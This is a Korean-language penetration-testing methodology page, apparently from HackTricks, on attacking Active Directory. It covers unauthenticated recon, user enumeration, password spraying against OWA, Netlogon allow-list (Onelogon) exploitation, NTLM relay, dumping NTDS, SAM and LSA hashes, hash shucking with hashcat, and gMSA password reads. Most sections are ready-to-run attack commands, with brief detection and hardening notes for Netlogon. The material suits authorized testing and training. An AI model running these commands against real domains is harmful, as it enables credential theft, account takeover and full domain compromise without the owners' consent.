# Active Directory 방법론

{{#include ../../banners/hacktricks-training.md}}

## 기본 개요

**Active Directory**는 **네트워크 관리자**가 네트워크 내에서 **도메인**, **사용자**, **개체**를 효율적으로 생성하고 관리할 수 있도록 하는 기반 기술입니다. 확장성을 고려해 설계되었으며, 방대한 수의 사용자를 관리 가능한 **그룹**과 **하위 그룹**으로 구성하고 여러 수준에서 **액세스 권한**을 제어할 수 있습니다.

**Active Directory** 구조는 기본적으로 **도메인**, **트리**, **포리스트**의 세 계층으로 이루어져 있습니다. **도메인**은 공통 데이터베이스를 공유하는 **사용자**나 **장치** 등의 개체 집합입니다. **트리**는 공통 구조로 연결된 도메인 그룹이며, **포리스트**는 **신뢰 관계**를 통해 서로 연결된 여러 트리의 집합으로, 조직 구조의 최상위 계층입니다. 각 계층에서 특정 **액세스** 및 **통신 권한**을 지정할 수 있습니다.

**Active Directory**의 주요 개념은 다음과 같습니다.

1. **Directory** – Active Directory 개체와 관련된 모든 정보를 저장합니다.
2. **Object** – 디렉터리 내의 **사용자**, **그룹**, **공유 폴더** 등의 엔터티를 의미합니다.
3. **Domain** – 디렉터리 개체를 담는 컨테이너입니다. **포리스트**에는 여러 도메인이 존재할 수 있으며, 각 도메인은 자체 개체 컬렉션을 유지합니다.
4. **Tree** – 공통 루트 도메인을 공유하는 도메인 그룹입니다.
5. **Forest** – Active Directory 조직 구조의 최상위 계층으로, 여러 트리와 그 사이의 **신뢰 관계**로 구성됩니다.

**Active Directory Domain Services (AD DS)**에는 네트워크 내 중앙 관리 및 통신에 필요한 다양한 서비스가 포함됩니다. 다음과 같습니다.

1. **Domain Services** – 데이터 저장소를 중앙화하고 **사용자**와 **도메인** 간의 상호 작용을 관리하며, **인증** 및 **검색** 기능을 제공합니다.
2. **Certificate Services** – 보안 **디지털 인증서**의 생성, 배포, 관리를 담당합니다.
3. **Lightweight Directory Services** – **LDAP 프로토콜**을 통해 디렉터리 기반 애플리케이션을 지원합니다.
4. **Directory Federation Services** – 한 번의 세션으로 여러 웹 애플리케이션에서 사용자를 인증하는 **single-sign-on** 기능을 제공합니다.
5. **Rights Management** – 저작권이 있는 자료의 무단 배포와 사용을 제한하여 보호하는 데 도움을 줍니다.
6. **DNS Service** – **도메인 이름** 확인에 필수적입니다.

더 자세한 설명은 다음을 참조하세요: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

**AD 공격** 방법을 익히려면 **Kerberos 인증 프로세스**를 제대로 **이해해야 합니다**.\
[**작동 방식을 아직 모른다면 이 페이지를 읽어보세요.**](kerberos-authentication.md)

## Cheat Sheet

[https://wadcoms.github.io/](https://wadcoms.github.io)에서 AD를 열거/익스플로잇할 때 실행할 수 있는 명령을 빠르게 확인할 수 있습니다.

> [!WARNING]
> Kerberos 통신은 클라이언트가 올바른 SPN에 대한 티켓을 얻을 수 있도록 일반적으로 **정규화된 도메인 이름(FQDN)**이 필요합니다. IP 주소로 시스템에 액세스하면 Kerberos 대신 NTLM으로 폴백되는 경우가 많습니다.

## Active Directory 정찰 (자격 증명/세션 없음)

AD 환경에 액세스할 수 있지만 자격 증명/세션이 없다면 다음을 시도할 수 있습니다.

- **네트워크 Pentest:**
  - 네트워크를 스캔하고, 시스템과 열린 포트를 찾은 다음, **취약점을 익스플로잇**하거나 해당 시스템에서 **자격 증명을 추출**해 보세요(예: [프린터는 매우 흥미로운 대상이 될 수 있습니다](ad-information-in-printers.md)).
  - DNS를 열거하면 도메인의 주요 서버(웹, 프린터, 공유, VPN, 미디어 등)에 대한 정보를 얻을 수 있습니다.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 이를 수행하는 방법에 대한 자세한 내용은 일반 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)를 참조하세요.
- **SMB 서비스에서 null 및 Guest 액세스 확인**(최신 Windows 버전에서는 작동하지 않습니다):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - SMB 서버 열거 방법에 대한 자세한 가이드는 여기에서 확인할 수 있습니다:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP 열거**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP 열거 방법에 대한 자세한 가이드는 여기에서 확인할 수 있습니다(**익명 액세스에 특히 주의하세요**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **네트워크 포이즈닝**
  - [**Responder로 서비스를 가장해**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 자격 증명을 수집합니다.
  - [**relay attack을 악용해**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 호스트에 액세스합니다.
  - [**evil-S로 가짜 UPnP 서비스를 노출해**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 자격 증명을 수집합니다.
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - 내부 문서, 소셜 미디어, 도메인 환경 내 서비스(주로 웹), 공개적으로 이용할 수 있는 자료에서 사용자 이름/이름을 추출합니다.
  - 회사 직원의 전체 이름을 알아냈다면 다양한 AD **사용자 이름 규칙(**[**여기 참조**](https://activedirectorypro.com/active-directory-user-naming-convention/))을 시도할 수 있습니다. 가장 흔한 규칙은 _이름성_, _이름.성_, _이름성_ (각각 3글자), _이름.성_ (각각 3글자), _이성_, _이.성_, _성_이름_, _성_이름_, _성_이름_ (끝에 이름 첫 글자), _성.이름첫글자_, _무작위 영문자 3개와 무작위 숫자 3개_ (abc123)입니다.
  - 도구:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### 사용자 열거

- **익명 SMB/LDAP 열거:** [**SMB Pentesting**](../../network-services-pentesting/pentesting-smb/index.html) 및 [**LDAP Pentesting**](../../network-services-pentesting/pentesting-ldap.md) 페이지를 확인하세요.
- **Kerbrute 열거**: **유효하지 않은 사용자 이름을 요청하면** 서버가 **Kerberos 오류** 코드 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_으로 응답하므로 사용자 이름이 유효하지 않음을 확인할 수 있습니다. **유효한 사용자 이름**의 경우 **AS-REP의 TGT** 응답 또는 사용자에게 사전 인증이 필요함을 나타내는 오류 _KRB5KDC_ERR_PREAUTH_REQUIRED_가 반환됩니다.
- **MS-NRPC에 인증 없이 접근**: 도메인 컨트롤러의 MS-NRPC(Netlogon) 인터페이스에 auth-level = 1(인증 없음)을 사용합니다. 이 방식은 MS-NRPC 인터페이스에 바인딩한 뒤 `DsrGetDcNameEx2` 함수를 호출하여 자격 증명 없이 사용자 또는 컴퓨터가 존재하는지 확인합니다. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 도구는 이러한 유형의 열거를 구현합니다. 관련 연구는 [여기](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>에서 확인할 수 있습니다.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) 서버**

네트워크에서 이러한 서버 중 하나를 발견했다면, 해당 서버를 대상으로 **user enumeration**도 수행할 수 있습니다. 예를 들어 [**MailSniper**](https://github.com/dafthack/MailSniper) 도구를 사용할 수 있습니다:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> [**이 github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)와 [**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)에서 사용자 이름 목록을 찾을 수 있습니다.
>
> 하지만 이보다 앞서 수행했어야 할 recon 단계에서 **회사에서 일하는 사람들의 이름**을 확보했어야 합니다. 이름과 성을 사용해 [**namemash.py**](https://gist.github.com/superkojiman/11076951) script로 유효할 가능성이 있는 사용자 이름을 생성할 수 있습니다.

### Netlogon 취약 채널 allow-list 악용 (Onelogon)

DC에 **Zerologon** 패치를 적용한 후에도 명시적으로 allow-list에 등록된 계정은 **레거시/취약 Netlogon 보안 채널 동작**에 여전히 노출될 수 있습니다. 위험한 설정은 GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** 또는 이에 해당하는 레지스트리 값 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**입니다.

이 값은 **SDDL 보안 설명자**입니다([Security Descriptors](security-descriptors.md) 참조). DACL에서 관련 ACE를 허가받은 계정이나 그룹은 모두 표적이 될 수 있습니다. 예를 들어 `O:BAG:BAD:(A;;RC;;;WD)`는 사실상 **Everyone**을 allow-list에 등록합니다.

실제 operator 작업 흐름:

1. **SYSVOL/GPO**와 **실행 중인 DC 레지스트리**를 모두 확인해 allow-list에 등록된 보안 주체를 **식별합니다**.
2. SDDL에 있는 SID를 실제 AD 사용자/컴퓨터로 **확인하고**, **DC 컴퓨터 계정**, **trust 계정** 및 기타 권한이 높은 컴퓨터를 우선적으로 살펴봅니다.
3. allow-list에 등록된 계정으로 **MS-NRPC / Netlogon 인증**을 반복적으로 시도합니다.
4. 추측에 성공한 후 **Netlogon 암호 설정**을 악용해 표적 계정의 암호를 재설정합니다(공개 PoC는 빈 문자열로 설정합니다).<sup>[[9]](#references)[[10]](#references)</sup>

공개 artifact에 포함된 빠른 triage / lab 예시:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

참고:

- **scanner**는 유효한 allow-list가 **SYSVOL**, **registry** 또는 두 곳 모두에 있을 수 있으므로 유용합니다.
- 취약한 계정을 식별한 뒤에는 **Domain Admin 권한이 없어도** exploit 경로를 이용할 수 있다는 점이 중요합니다.
- `DC$`와 같은 **Domain Controller machine account**를 장악하는 것은 특히 위험합니다. 해당 계정의 password를 재설정하면 더 광범위한 **AD takeover** 경로가 직접 열릴 수 있습니다.
- **Brute-force 가능성**은 모드에 따라 다릅니다. 공개된 artifact에는 meet-in-the-middle 방식, 다른 computer account를 사용할 수 있을 때의 **24-bit** brute force, 그리고 더 느린 **32-bit** 변형이 설명되어 있습니다.

탐지 / hardening 참고 사항:

- allow-list 정책을 감사하고, 임시로 명시적인 호환성 예외가 필요한 경우를 제외한 모든 항목을 제거합니다.
- DC의 **System** 이벤트 **5827/5828/5829/5830/5831**을 모니터링하여 취약한 Netlogon 연결이 거부되거나, 발견되거나, 정책에 따라 명시적으로 허용되는지 확인합니다.
- `VulnerableChannelAllowList`의 계정은 legacy 종속성이 제거될 때까지 **고위험**으로 취급합니다.

### 하나 이상의 username을 알고 있는 경우

좋습니다. 유효한 username은 이미 알고 있지만 password가 없다면 다음을 시도해 보세요.

- [**ASREPRoast**](asreproast.md): 사용자에게 _DONT_REQ_PREAUTH_ attribute가 **설정되어 있지 않으면**, 해당 사용자의 **AS_REP message를 요청**할 수 있습니다. 이 message에는 사용자 password를 파생해 만든 키로 암호화된 데이터가 포함됩니다.
- [**Password Spraying**](password-spraying.md): 발견한 각 사용자에게 가장 **흔한 password**를 시도해 보세요. password가 취약한 사용자가 있을 수도 있습니다(password policy에 유의하세요!).
  - 사용자의 mail server에 접근할 수 있는지 확인하기 위해 **OWA server**에 **spray**를 시도할 수도 있습니다.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

**network**의 일부 protocol을 **poisoning**하여 challenge **hash**를 **얻을** 수 있을지도 모릅니다.


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration을 통해 username, email 식별자 및 네이밍 패턴, 후보 host, 그리고 인증을 유도할 수 있는 service를 파악할 수 있습니다. 이 정보를 사용해 실행 가능한 NTLM [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)과 AD 환경으로 진입할 가능성이 있는 경로를 식별하세요.

### NetExec workspace 기반 recon 및 relay 보안 상태 점검

- **`nxcdb` workspace**를 사용해 engagement별로 AD recon 상태를 관리하세요. `workspace create <name>`은 `~/.nxc/workspaces/<name>` 아래에 protocol별 SQLite DB(smb/mssql/winrm/ldap 등)를 생성합니다. `proto smb|mssql|winrm`으로 보기를 전환하고, `creds`로 수집한 secret을 확인할 수 있습니다. 작업이 끝나면 민감한 데이터를 직접 삭제하세요: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`**로 빠르게 subnet을 탐색하면 **domain**, **OS build**, **SMB signing 요구 사항**, **Null Auth**를 확인할 수 있습니다. `(signing:False)`로 표시된 member는 **relay에 취약할 수 있으며**, DC는 대개 signing을 요구합니다.
- NetExec 출력에서 **/etc/hosts에 hostname을 생성**하여 targeting을 간편하게 하세요:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- **SMB relay to the DC is blocked** by signing되어 있더라도 **LDAP** 보안 상태를 확인하세요: `netexec ldap <dc>`는 `(signing:None)` / 약한 channel binding을 표시합니다. SMB signing이 필수이지만 LDAP signing이 비활성화된 DC는 **SPN-less RBCD**와 같은 악용을 위한 실행 가능한 **relay-to-LDAP** 대상입니다.

### 클라이언트 측 프린터 credential leaks → 도메인 자격 증명 대량 검증

- 프린터/웹 UI에는 **마스킹된 관리자 암호가 HTML에 포함**되어 있는 경우가 있습니다. 소스 보기/devtools에서 평문을 확인할 수 있으며(예: `<input value="<password>">`), 이를 이용해 Basic-auth로 스캔/인쇄 저장소에 접근할 수 있습니다.
- 가져온 인쇄 작업에는 사용자별 암호가 포함된 **평문 온보딩 문서**가 있을 수 있습니다. 테스트할 때는 각 쌍을 정확히 맞춰 두세요:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM 자격 증명 탈취

**null 또는 guest 사용자로 다른 PC나 공유 폴더에 접근**할 수 있다면, SCF 파일 같은 **파일을 배치**할 수 있습니다. 누군가 해당 파일에 접근하면 **사용자를 대상으로 NTLM 인증을 유도**해 **NTLM challenge를 탈취**하고 크랙할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**은 이미 보유한 모든 NT hash를, 키 자료가 NT hash에서 직접 파생되는 다른 느린 형식의 후보 비밀번호로 사용합니다. Kerberos RC4 티켓, NetNTLM challenge 또는 캐시된 자격 증명에 대해 긴 암호 문구를 brute-force하는 대신, NT hash를 Hashcat의 NT-candidate 모드에 입력해 평문을 알아내지 않고 비밀번호 재사용 여부를 검증합니다. 도메인 침해 후 현재 및 과거 NT hash를 수천 개 수집할 수 있는 상황에서 특히 강력합니다.<sup>[[5]](#references)</sup>

다음과 같은 경우 shucking을 사용하세요.

- DCSync, SAM/SECURITY 덤프 또는 자격 증명 vault에서 얻은 NT hash 모음이 있고, 다른 도메인/forest에서 재사용 여부를 확인하려는 경우
- RC4 기반 Kerberos 자료(`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM 응답 또는 DCC/DCC2 blob을 캡처한 경우
- 크랙할 수 없는 긴 암호 문구의 재사용 여부를 빠르게 입증하고 Pass-the-Hash로 즉시 피벗하려는 경우

이 기법은 키가 NT hash가 아닌 암호화 유형(예: Kerberos etype 17/18 AES)에는 **통하지 않습니다**. 도메인에서 AES만 허용하는 경우 일반 비밀번호 모드로 돌아가야 합니다.

#### NT hash 모음 만들기

- **DCSync/NTDS** – `secretsdump.py`에서 history 옵션을 사용해 최대한 많은 NT hash와 이전 값을 가져옵니다:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  History 항목은 Microsoft가 계정당 이전 해시를 최대 24개까지 저장할 수 있으므로 후보군을 크게 넓혀 줍니다. NTDS secrets를 수집하는 다른 방법은 다음을 참조하세요.

{{#ref}}
dcsync.md
{{#endref}}

- **엔드포인트 캐시 덤프** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (또는 Mimikatz `lsadump::sam /patch`)는 로컬 SAM/SECURITY 데이터와 캐시된 도메인 로그온 정보(DCC/DCC2)를 추출합니다. 중복을 제거한 뒤 해당 해시를 같은 `nt_candidates.txt` 목록에 추가하세요.
- **메타데이터 추적** – 각 해시를 생성한 사용자 이름/도메인을 기록해 두세요(워드리스트에 16진수 값만 있어도). Hashcat이 정답 후보를 출력하면 해시를 통해 어떤 주체가 암호를 재사용하는지 즉시 알 수 있습니다.
- shucking 시 해시가 겹칠 가능성을 극대화하려면 같은 forest 또는 신뢰된 forest의 후보를 우선 사용하세요.

#### Hashcat NT-candidate 모드

| 해시 유형                                | 암호 모드 | NT-candidate 모드 |
| ---------------------------------------- | ------------- | ----------------- |
| 도메인 캐시 자격 증명(DCC)          | 1100          | 31500             |
| 도메인 캐시 자격 증명 2(DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

참고:

- NT-candidate 입력은 **32자리 16진수 NT 해시 원본이어야 합니다**. 규칙 엔진을 비활성화하세요(`-r` 사용 금지, 하이브리드 모드 사용 금지). 변형 작업으로 후보 키 자료가 손상될 수 있습니다.
- 이 모드가 본질적으로 더 빠른 것은 아니지만, NTLM 키스페이스(~30,000 MH/s on an M3 Max)는 Kerberos RC4(~300 MH/s)보다 약 100배 빠릅니다. 엄선한 NT 목록을 테스트하는 것이 느린 형식에서 전체 암호 공간을 탐색하는 것보다 훨씬 저렴합니다.
- **최신 Hashcat 빌드**를 항상 실행하세요(`git clone https://github.com/hashcat/hashcat && make install`). 모드 31500/31600/35300/35400은 최근에 추가되었습니다.<sup>[[7]](#references)</sup>
- 현재 AS-REQ Pre-Auth용 NT 모드는 없으며, AES etype(19600/19700)는 원시 NT 해시가 아닌 UTF-16LE 암호에서 PBKDF2로 키를 파생하므로 평문 암호가 필요합니다.

#### 예시 – Kerberoast RC4 (모드 35300)

1. 권한이 낮은 사용자로 대상 SPN의 RC4 TGS를 캡처합니다(자세한 내용은 Kerberoast 페이지 참조):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. NT 리스트를 사용해 티켓을 shuck합니다:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat은 각 NT 후보에서 RC4 키를 도출하고 `$krb5tgs$23$...` blob을 검증합니다. 일치하면 해당 서비스 계정이 이미 보유한 NT 해시 중 하나를 사용한다는 뜻입니다.

3. 즉시 PtH로 전환합니다:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   필요한 경우 나중에 `hashcat -m 1000 <matched_hash> wordlists/`를 사용해 평문을 복구할 수 있습니다.

#### 예시 – 캐시된 자격 증명 (mode 31600)

1. 침해된 워크스테이션에서 캐시된 로그온 정보를 덤프합니다:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. 관심 있는 도메인 사용자의 DCC2 라인을 `dcc2_highpriv.txt`에 복사한 다음 shuck합니다:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. 성공적으로 일치하면 목록에 이미 있는 NT hash가 확인되어, 캐시된 사용자가 같은 password를 재사용하고 있음을 증명합니다. 이를 PtH에 직접 사용하거나(`nxc smb <dc_ip> -u highpriv -H <hash>`), 빠른 NTLM 모드로 brute-force하여 문자열을 복구하세요.

NetNTLM challenge-response(`-m 27000/27100`)와 DCC(`-m 31500`)에도 똑같은 workflow를 적용할 수 있습니다. 일치 항목을 찾으면 relay, SMB/WMI/WinRM PtH를 실행하거나, masks/rules를 사용해 오프라인에서 NT hash를 다시 crack할 수 있습니다.



## 자격 증명/세션을 사용한 Active Directory 열거

이 단계에서는 **유효한 도메인 계정의 자격 증명이나 세션을 확보해야 합니다.** 유효한 자격 증명이 있거나 도메인 사용자 권한의 shell을 확보했다면, **앞서 설명한 방법으로 다른 사용자도 계속 침해할 수 있다는 점을 기억하세요.**

인증된 열거를 시작하기 전에 **Kerberos double-hop 문제**를 이해하세요.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 열거

계정을 침해하는 것은 **도메인을 평가하는 데 있어 중요한 단계**입니다. 인증된 **Active Directory 열거**가 가능해지기 때문입니다.

[**ASREPRoast**](asreproast.md)와 관련해서는 취약할 가능성이 있는 사용자를 모두 찾을 수 있고, [**Password Spraying**](password-spraying.md)과 관련해서는 **모든 사용자 이름 목록**을 확보해 침해한 계정의 password, 빈 password, 새로 발견한 유력한 password를 시도할 수 있습니다.

- [**기본적인 정찰을 수행하는 CMD**](../basic-cmd-for-pentesters.md#domain-info)를 사용할 수 있습니다.
- [**정찰을 위한 powershell**](../basic-powershell-for-pentesters/index.html)도 사용할 수 있으며, 이쪽이 더 은밀합니다.
- [**powerview 사용**](../basic-powershell-for-pentesters/powerview.md)으로 더 상세한 정보를 추출할 수도 있습니다.
- Active Directory 정찰에 유용한 또 다른 도구는 [**BloodHound**](bloodhound.md)입니다. **은밀성이 높지는 않지만**(사용하는 collection 방식에 따라 다름), **은밀성에 신경 쓰지 않는다면** 꼭 사용해 보세요. 사용자가 RDP할 수 있는 곳, 다른 그룹으로 이어지는 경로 등을 찾을 수 있습니다.
  - **그 밖의 자동화된 AD 열거 도구:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- 흥미로운 정보가 들어 있을 수 있는 [**AD의 DNS 레코드**](ad-dns-records.md)를 확인하세요.
- 디렉터리 열거에 사용할 수 있는 **GUI 도구**로 **SysInternal** Suite의 **AdExplorer.exe**가 있습니다.
- **ldapsearch**로 LDAP 데이터베이스를 검색해 _userPassword_ 및 _unixUserPassword_ 필드, 또는 사용자 _description_ 및 _info_ 메모에서 자격 증명을 찾을 수도 있습니다. _info_에 라벨 없이 password처럼 보이는 문자열이 있더라도 이는 후보일 뿐입니다. 용도와 유효성은 별도로 확인하고, 일반적인 열거 출력에 메모 내용을 포함하지 마세요. 다른 방법은 PayloadsAllTheThings의 [PayloadsAllTheThings의 AD 사용자 주석에 있는 Password](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)를 참고하세요.
- 권한이 허용되는 경우 `\\<dc>\NETLOGON` 또는 `\\<dc>\SYSVOL\<domain>\scripts`에 있는 **접근 가능한** 도메인 로그온 및 드라이브 매핑 스크립트를 검토하세요. [Microsoft 문서](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller)에는 NETLOGON share의 스크립트 디렉터리 역할이 설명되어 있습니다. 먼저 파일 이름을 나열한 다음, 크기 제한을 두고 관련된 읽기 가능 스크립트만 검사하세요. 전체 share를 덤프하거나 일반적인 열거 과정에서 자격 증명 값을 출력하지 마세요. 스크립트에 저장된 리터럴 password는 PowerShell의 [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) 호출로 **보호되지 않습니다**. 해당 호출만으로 secret이 하드코딩되었다고 단정할 수는 없습니다. 실제 입력값을 추적한 다음 계정, 자격 증명의 유효성 및 권한을 별도로 확인하세요. 도메인 스크립트 검토는 원격 share 검토이며, 로컬 호스트 열거와는 별개입니다.
- **Linux**를 사용한다면 [**pywerview**](https://github.com/the-useless-one/pywerview)로도 도메인을 열거할 수 있습니다.
- 다음과 같은 자동화 도구도 사용해 볼 수 있습니다.
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **모든 도메인 사용자 추출**

  Windows에서는 도메인의 사용자 이름을 모두 쉽게 가져올 수 있습니다(`net user /domain` ,`Get-DomainUser` 또는 `wmic useraccount get name,sid`). Linux에서는 다음을 사용할 수 있습니다. `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 또는 `enum4linux -a -u "user" -p "password" <DC IP>`

> 이 열거 섹션은 짧아 보일 수 있지만, 전체 과정에서 가장 중요한 부분입니다. 링크(특히 cmd, powershell, powerview, BloodHound)를 확인하고, 도메인 열거 방법을 익힌 뒤 익숙해질 때까지 연습하세요. 평가 중에는 이 단계에서 DA로 가는 경로를 찾거나, 더 이상 할 수 있는 일이 없다고 판단하게 됩니다.

### 예측 가능한 사전 생성 컴퓨터 계정 -> gMSA password 접근

레거시 join을 위해 미리 생성된 컴퓨터 계정에는 예측 가능한 초기 password가 남아 있을 수 있습니다. NetExec의 `pre2k` 모듈은 특징적인 `userAccountControl` 값 `4128`(`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`)을 찾아 컴퓨터 이름의 소문자 첫 14자(끝의 `$` 제외)로 Kerberos TGT를 시도합니다. 이 UAC 값은 후보를 고르는 기준으로 취급하세요. **Pre-Windows 2000 Compatible Access** 그룹에 속한다는 사실만으로 password가 취약하다고 단정해서는 안 됩니다.<sup>[[18]](#references)[[20]](#references)</sup>

인증된 LDAP 열거로 후보를 테스트하고 성공한 TGT를 저장하세요. `ALL=True`를 지정하면 기본 `4128` 필터에 해당하는 객체 외에도 테스트 대상이 확장됩니다.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

기본/NTLM bind가 실패했다고 해서 이 finding이 무효가 되는 것은 아닙니다. `-k`, DC로 확인되는 FQDN, KDC와 동기화된 clock을 사용해 테스트하세요. 모듈 실행이 성공하면 후보 목록과 획득한 ccache가 `~/.nxc/modules/pre2k/` 아래에 저장됩니다.<sup>[[18]](#references)[[20]](#references)</sup>

computer principal을 침해한 뒤에는 중첩된 그룹 멤버십과 아웃바운드 권한을 그래프로 확인하세요. 특히 gMSA의 `msDS-GroupMSAMembership` 보안 설명자에 지정된 principal은 `msDS-ManagedPassword`를 읽을 수 있습니다. NetExec의 `--gmsa` 출력에는 허용된 principal이 표시되며, 인증에 사용하는 computer가 권한을 가진 경우 현재 NT hash가 반환됩니다.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

